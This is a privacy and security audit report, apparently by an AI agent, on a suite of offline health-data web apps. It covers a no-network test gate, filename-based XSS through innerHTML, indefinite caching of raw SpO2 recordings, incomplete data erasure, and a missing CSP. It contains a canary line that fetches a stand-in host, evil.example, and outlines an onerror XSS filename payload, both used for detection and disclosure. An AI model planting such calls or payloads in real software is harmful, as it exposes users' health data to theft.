<!-- SPDX: Copyright 2026 Michal Planicka · SPDX-License-Identifier: Apache-2.0 -->
**Status:** AUDIT FINDINGS (privacy & security pass per `PRIVACY-SECURITY-AUDIT-PROMPT.md`) · **Created:** 2026-07-01 · **Auditor:** AI agent · **Method:** invariant + demonstrated-violation (a network call caught / a key found persisted / a field traced to the DOM), origin-classified static grep of all 8 bundles + runtime traps · **Do-first built:** [`no-network.html`](no-network.html) (green — 8/8 static + runtime, negative control passed) · **Siblings:** `AUDIT-PROMPT.md` (correctness) · `EFFICIENCY-AUDIT-PROMPT.md` (efficiency) · **Posture doc:** `PHI-SURFACE-STATEMENT.md`

# Privacy & security findings — Tepna Dex suite (2026-07-01)

Ran the `PRIVACY-SECURITY-AUDIT-PROMPT.md` MISSION. Framing is **portable data-protection principles**
(minimization · storage-limitation · local-control · transparency · security-of-processing), **not** any
national regime — and nothing here contradicts the intended-use / not-a-medical-device disclaimer
(LICENSING-BRIEF §6.5) or claims a compliance certification. **This is a REPORT.** Each accepted finding
spawns its own dated gated change-brief; nothing was fixed in this pass. Every finding carries a
**demonstration** (exact file:line / key / traced field), and hypotheses are labelled as such.

The suite's architecture is its biggest privacy asset and it largely holds: the **export channel is already
mature** (contentId is identity-free, the filename is scrubbed to a vendor+lane tag, the floating clock keeps
exports viewer-timezone-independent, the profile is never exported — `PHI-SURFACE-STATEMENT.md`,
EXPORT-IDENTITY/HYGIENE briefs), so that pillar is **not re-filed**. The live surface this pass found is
**(a) untrusted filename → `innerHTML` (XSS)** and **(b) storage minimization / local-control** — a raw
recording persisted indefinitely with no complete "erase my data" path — plus a defense-in-depth **CSP gap**.

---

## 0 · The NO-NETWORK invariant (flagship) — HOLDS, and is now enforced

**Invariant:** no shipped bundle initiates network egress — no `fetch`/`XHR`/`WebSocket`/`EventSource`/
`sendBeacon`/dynamic-`import()` to a remote origin, no remote `src`/`href`/`@font-face`/CSS `url()`, no
`<img>` beacon. **Demonstration it holds:** an origin-classified static grep of all 8 committed bundles
(`ECGDex OxyDex PulseDex GlucoDex PpgDex HRVDex CPAPDex Integrator`) finds **zero** remote-URL targets and
**zero** transport-only primitives; every `fetch(` in a bundle is a **same-origin/relative** load of a
bundled asset — the babel-transform bootstrap `fetch(s.src)` (dead in the inlined bundle), and
`fetch('uploads/'+name)` / `fetch(path)` demo-file loads in CPAPDex/Integrator. There is **no**
`XMLHttpRequest`/`WebSocket`/`EventSource`/`sendBeacon` anywhere in the source (only in the charter doc and a
`manifest-gate.js` comment), and **no** `@font-face`/CDN (removed June 2026, `AUDIT.md`). The only `https://`
in a shipped surface are journal-citation `<a href="https://doi.org/…" target="_blank" rel="noopener">`
links in the reference guides — a user-initiated navigation, not automatic egress.

**What was built (the do-first):** [`no-network.html`](no-network.html) — the privacy analogue of
`verify-provenance.html`, self-contained, adds no runtime behavior to any app (**no re-bundle**). Verdict is
programmatic: `window.__noNetworkOK` (+ `__staticOK`/`__runtimeOK`/`__canaryOK`, `noNetworkStatus()`).

- **Layer 1 (static)** greps each bundle and **classifies every egress primitive by target origin**: a
  remote/absolute-URL (or protocol-relative `//`) target, or any transport-only primitive, is a **HARD FAIL**;
  a relative / same-origin / `data:` / `blob:` load of a bundled asset is **allowed and listed**. *This origin
  classification is the substantive refinement of the charter's naïve "any `fetch(` fails" grep* — a literal
  reading would red every bundle on the benign babel bootstrap and the local demo loads. The gate lists them
  as allowed local loads instead (live proof: CPAPDex surfaces **10 local `fetch`** to `uploads/*.edf`, all
  classified local — the discrimination is real, not vacuous).
- **Layer 2 (runtime)** boots each bundle in a trapped, sandboxed iframe (`srcdoc` with a trap injected at the
  top of `<head>`) whose `fetch`/`XHR`/`WebSocket`/`EventSource`/`sendBeacon` **throw on a cross-origin
  target** but allow same-origin; asserts none fired. Result: **8/8 booted, 0 cross-origin fired.**
- **Negative control (REQUIRED — proves the detector has teeth):** a canary that (static) plants a real
  `fetch("https://evil.example/x")` + a remote `<script src>`/`WebSocket`/`sendBeacon`/`@import` the scanner
  **must** flag, **and** a benign local string it must **not** flag (proving it is neither blind nor
  trigger-happy); (runtime) attempts one remote `fetch`/`WebSocket`/`sendBeacon` against the trap (must throw)
  plus one local fetch (must be allowed). All **7 canary checks pass**; a failed control HARD-FAILS the whole
  gate so a vacuous green can never ship. Kept minimal per the charter — no honeytoken (an offline app has no
  listening post).

**Scope & coverage (extended 2026-07-01 after review).** The gate covers **both web-app surfaces a user
opens**, not just the manifest bundles: the **8 self-contained bundles** *and* the **2 unbundled
orchestrators** — `Data Unifier.html` / `OverDex.html` — which are *outside* `BUILD-MANIFEST.json` and whose
real code lives in loose `<script src>` modules (adapters, DSPs, `signal-orchestrate.js`, the app JS). The
gate now fetches + scans each loose module too, and runtime-boots the orchestrators. Both are clean (0
remote egress; only a remote `<a href>` citation would be classed as *navigation*, not egress — the
classifier distinguishes them). **Python (`capture-host/`)** is a *different execution surface a browser gate
cannot run*, so it gets a **static lens** (Layer 3): `capture.py`/`polar_pmd.py`/`writers.py` +
`requirements.txt` are scanned for an outbound HTTP client. Posture is **BLE-in → disk-out → LAN-serve**:
only `bleak` (local Bluetooth) + `PyYAML` are imported, the web tier is Caddy serving `/srv/tepna/app` on
`tepna.local` (a LAN file server, explicitly *not* egress per the Caddyfile), and `requirements.txt` has **no
HTTP-client dependency** — so no outbound egress by construction. The lens is **not authoritative** (a browser
can't execute Python); the durable Python check belongs in CI (an import-allowlist over `capture-host/`) —
a follow-up. The canary now exercises all three lenses (JS, `<a href>`-nav, Python).

**Recommended follow-up (its own dated brief, not done here):** wire Layers 1+2 as a group in
`tests/dex-tests.js` (BOTH runners) and the Python lens into `tests/run-tests.mjs` so it rides the canonical
gate. That edit touches the shared test file / both runners → a deliberate gated change, out of scope for a
report pass. **Gate impact: none today** (standalone page only, no app touched, no re-bundle).

---

## Demonstrated findings — ordered by severity × certainty

Reporting shape per finding: *invariant · severity · demonstration · principle · proposed one gated change ·
gate impact.*

### F1 · Stored XSS via a crafted filename (OxyDex) — HIGH
- **Invariant:** untrusted input (a filename) never reaches the DOM as markup.
- **Demonstration:** `oxydex-app.js:321` — `chip.innerHTML = '📂 Reload: <strong>'+name+'</strong>';` where
  `name = localStorage.getItem('oxydex_last_name')` (line 313–314), i.e. the **raw filename of the last loaded
  file**, persisted and re-inserted on every load by `_oxyRestoreLast()`. A file named
  `<img src=x onerror=…>.csv` stores that string (see F4) and its payload **auto-executes on the next visit**.
  The sibling `showChip()` uses `.textContent` (safe) — so the escaping is *inconsistent*, the classic gap.
- **Principle:** security-of-processing. XSS here runs in the origin that holds the profile and the cached raw
  recording (F4) — it can read them, drive the export/clipboard path, or corrupt results; the no-network
  invariant blunts exfil but does not make script-injection acceptable.
- **Proposed gated change:** render the name via `textContent` (build the `<strong>` as an element and set its
  `.textContent`), or route through a shared `escapeHTML()` before interpolation.
- **Gate impact:** `oxydex-app.js` (external JS) → re-bundle **OxyDex** → GATE-A manifestHash update.
  Display-only, `compute()`/export untouched → **EXPORT-INERT**: both OxyDex code-gated fixtures re-record
  manifestHash only, not regenerated. Add a Dex-Test-Suite source-mirror/functional group asserting the
  filename is escaped.

### F2 · Reflected XSS via a crafted comparison filename (PulseDex) — MED
- **Invariant:** as F1.
- **Demonstration:** `pulsedex-app.js:134` sets `cmpData.label = f.name` (the dropped comparison file's name);
  line 187 builds `refLab = … + cmpData.label`; line ~204 emits `'<th …>'+refLab+'</th>'` into `tbl`; line 231
  `card.innerHTML = … tbl …`. Same path for `lastResult.fname → priLab`. A comparison file named with an
  `<img onerror>` payload injects when the comparison table renders. (Status text at line 135 correctly uses
  `.textContent` — again inconsistent.)
- **Principle:** security-of-processing.
- **Proposed gated change:** escape `priLab`/`refLab` (and any `res.error`/`res.note` interpolated into the
  same `innerHTML`) via a shared `escapeHTML()`.
- **Gate impact:** `pulsedex-app.js` → re-bundle **PulseDex** → GATE-A update. Display-only → **EXPORT-INERT**
  (both PulseDex code-gated fixtures re-record manifestHash only). Add a source-mirror assertion.

### F4 · Raw recording + unscrubbed filename persisted indefinitely (OxyDex) — MED
- **Invariant (storage-minimization / storage-limitation):** persist no more than a session needs, and no
  identifying raw data at rest longer than the user intends.
- **Demonstration:** `oxydex-dsp.js:287` — `window._cacheO2CSV(rawText, currentFileName || 'o2ring.csv')`
  writes the **entire raw CSV** (a whole night of SpO₂ — the most intimate signal) to `localStorage`
  (`oxydex_last_csv`) plus the **raw, unscrubbed filename** (`oxydex_last_name`), with no TTL and no cap. This
  is **asymmetric with the export posture**: `PHI-SURFACE-STATEMENT.md` scrubs the filename to a vendor+lane
  tag on export, but the localStorage cache keeps the raw name (which can embed a patient name). It also
  **compounds F1** — this cache is exactly the payload the F1 XSS reads, and the cached raw name is the F1
  injection vector.
- **Principle:** minimization, storage-limitation.
- **Proposed gated change (decision, in its own brief):** either (a) drop the raw-CSV cache and keep only a
  small "last session" descriptor, or (b) if the "📂 Reload" convenience is wanted, **scrub the cached name**
  (reuse `SignalFrame.scrubFilename`) and gate the raw-CSV cache behind an explicit opt-in + a visible
  "stored on this device" disclosure. HRVDex's `hrvdex_rows_v1` already stores only derived seeds + caps on
  quota — a lighter precedent.
- **Gate impact:** `oxydex-dsp.js`/`oxydex-app.js` → re-bundle **OxyDex**; storage behavior only →
  **EXPORT-INERT** (fixtures re-record manifestHash).

### F5 · "Clear" does not clear, and there is no complete "erase my data" path — MED
- **Invariant (local-control / transparency):** the user can see and delete what is stored, and a delete
  removes **all** of it — not just the keys one app happens to know about (the charter's explicit test).
- **Demonstration:** OxyDex's own `clearAll()` (`oxydex-app.js:43`) resets `allNights`, review mode, chart
  cache and the UI, but **never `removeItem`s** `oxydex_last_csv`/`oxydex_last_name` → after the user clicks
  Clear, the **raw night + raw filename remain** and the "📂 Reload: <name>" chip returns on reload. Suite-wide
  there is **no single control** that erases the union of persisted health data: the shared profile
  (`tepna_profile`, age/sex/height/weight), each node's keys (`oxydex_last_*`, `hrvdex_rows_v1`,
  `glucodex_meals`, …), and the Integrator's durable **IndexedDB** longitudinal store (`ganglior_integrator`)
  are each cleared only piecemeal by whichever app owns them (HRVDex, GlucoDex, Integrator have their own
  Clear; OxyDex's raw cache and the profile have none). A user wiping a shared machine has no discoverable
  one-click path.
- **Principle:** local-control, transparency.
- **Proposed gated change (its own brief):** (1) OxyDex `clearAll()` also `removeItem`s its raw cache; (2) a
  shared **"Erase all data on this device"** control (a small addition to the profile panel / a shared
  `dex-forget.js`) that clears the full known key-set across nodes **and** `indexedDB.deleteDatabase(
  'ganglior_integrator')`, with a short "what's stored here" disclosure.
- **Gate impact:** a shared helper + per-app wiring → multi-node re-bundle; storage behavior only →
  **EXPORT-INERT**. Scope carefully (the erase must enumerate every current key — keep the list beside the
  storage-key inventory so it can't drift).

### F7 · No Content-Security-Policy anywhere (defense-in-depth) — LOW–MED
- **Invariant (security-of-processing):** enforce no-network at the browser layer behind the code invariant,
  and blunt any XSS (F1/F2).
- **Demonstration:** no `<meta http-equiv="Content-Security-Policy">` in any bundle or `.src.html`
  (grep of `Content-Security-Policy|http-equiv` finds only footer links + citations). Nothing pins
  `connect-src`/`default-src`, so a future stray `fetch`/beacon — or an F1/F2 injection — has no second line
  of defense.
- **Principle:** security-of-processing.
- **Proposed gated change (its own brief):** add a meta-CSP to each `.src.html` `<head>` — at minimum
  `connect-src 'none'; default-src 'self'; object-src 'none'; base-uri 'none'; form-action 'none'`
  (`connect-src 'none'` alone stops every `fetch`/`XHR`/`WebSocket`/`EventSource`/`sendBeacon`). **Caveat:**
  the bundles rely on inline `<script>`/`<style>`, so a strict `script-src` would need `'unsafe-inline'` or a
  build-time nonce/hash — decide that in the brief; `connect-src`/`default-src` are compatible today and
  carry most of the value. Note the local demo-file `fetch('uploads/…')` needs `connect-src 'self'` (not
  `'none'`) if those demos must keep working — a deliberate tradeoff to record.
- **Gate impact:** a `<meta>` in each `.src.html` `<head>` is an **inline-shell edit** → re-bundle **all 8**,
  GATE-A manifestHash **and `buildHash`** move (unlike the external-JS pattern). Display/transport only →
  **EXPORT-INERT** (fixtures re-record manifestHash). Heaviest of the set — its own pass.

### F3 · Error string → `innerHTML` (OxyDex) — LOW–MED
- **Invariant:** as F1 (a secondary untrusted→DOM sink).
- **Demonstration:** `oxydex-dsp.js:314–316` — `errEl.innerHTML = '…<code class="error-code">' + String(e) +
  '</code>…'`. If a parse error message ever embeds file-derived text (a bad header/value echoed into the
  thrown `Error`), it injects. Not proven to carry attacker text today (hypothesis-adjacent), but the sink is
  demonstrably `innerHTML` over a value that is not guaranteed static.
- **Principle:** security-of-processing.
- **Proposed gated change:** escape `String(e)` (or set `.textContent` on the `<code>`); fold into the F1
  OxyDex brief.
- **Gate impact:** with F1 (OxyDex re-bundle, EXPORT-INERT).

### F6 · Legacy profile keys linger after migration (minimization) — LOW
- **Invariant (storage-minimization / storage-limitation):** don't keep stale duplicate copies of identity
  data.
- **Demonstration:** `dex-profile.js migrate()` (line 175) writes the unified `tepna_profile` from the 6
  legacy per-node keys (`oxydex_profile`, `ecgdex_profile`, `pulsedex_profile`, …) but **never `removeItem`s
  them** (the only `removeItem` in the file is the in-memory test store at line 52). After migration the old
  per-node identity records remain as stale duplicates. (Same shape, lower stakes: the depth-tier migrate in
  `metric-registry.js` and the vestigial `o2ring_last_*`/`hrvdex_last_csv` keys.)
- **Principle:** minimization.
- **Proposed gated change:** `migrate()` deletes each legacy key it successfully folds forward (idempotent;
  still "never fabricates").
- **Gate impact:** `dex-profile.js` is bundled into the 6 profile apps → re-bundle those 6; export-inert.
  Naturally pairs with F5 (both are storage-hygiene).

---

## Not findings — verified & deliberately NOT re-filed

- **Export / egress-by-user-action is mature.** contentId identity-free; filename scrubbed on **both**
  provenance pipes; floating wall-clock keeps exports viewer-timezone-independent (no real-instant/zone leak);
  profile never written to a node-export (`PHI-SURFACE-STATEMENT.md` §1–§3). The Integrator "Copy" writes the
  **already-scrubbed** fusion export to the clipboard on an explicit click — sanctioned egress-by-user-action.
  No re-file. (The one open item — §4(b) external compliance sign-off — is a legal call, explicitly out of
  scope.)
- **`eval`/`new Function` execution-security:** the only `new Function` is in `support.js` (the preview / DC
  runtime — **environment tooling, not a shipped Dex bundle**); no Dex app uses `eval`/`new Function`. The
  only URL `import()` is `tools/derive-sigma-window.mjs` (a Node build tool, local file URL). Recorded so it
  isn't re-investigated.
- **Fonts / no woff2 / no CDN / PulseDex's locally-bundled IBM Plex Mono, and the floating wall-clock time
  model** — intentional and privacy-correct (a font CDN would be a load beacon; the floating clock is a
  zone-privacy feature). Per charter out-of-scope; not findings.

## Hypotheses (unproven — labelled)

- **CSV *field* values → `innerHTML` beyond the filename.** The demonstrated XSS vector is the filename; other
  parsed fields (vendor strings, headers) rendered through the same `innerHTML` render paths *could* be
  additional sinks, but were not traced end-to-end this pass. The F1/F2 fixes (a shared `escapeHTML`) should
  be written to cover file-derived values generally, not just the name.
- **`glucodex_meals` free-text.** `glucodex-app.js:19` persists user meal annotations; if those carry
  free-text labels, that's minor user-typed PII at rest (it has a Clear control). Not traced.

## Do-first shortlist (highest value first)

1. **`no-network.html` — DONE & green** (this pass). Follow-up brief: wire it into `tests/dex-tests.js` (both
   runners) to ride the canonical gate.
2. **F1 + F2 + F3** — one brief: a shared `escapeHTML()` for every file-derived value reaching `innerHTML`
   (OxyDex reload chip + error block, PulseDex comparison labels). HIGH-value, EXPORT-INERT, 2-bundle
   re-bundle.
3. **F5 + F4 + F6** — one storage-hygiene brief: OxyDex `clearAll()` clears its raw cache; a suite-wide "erase
   all data on this device" (incl. the Integrator IndexedDB); scrub-or-drop the cached raw name; delete legacy
   profile keys on migrate.
4. **F7** — meta-CSP pass (all-8 re-bundle, `buildHash` moves): its own brief given the inline-script caveat.

Each accepted item lands as `<NAME>-2026-…-BRIEF.md`, honors the re-bundle + GATE-A/fixture and
`Dex-Test-Suite.html?full` + `verify-provenance.html` gates, and touches no frozen name / the
`ganglior.node-export` schema / the Clock Contract.
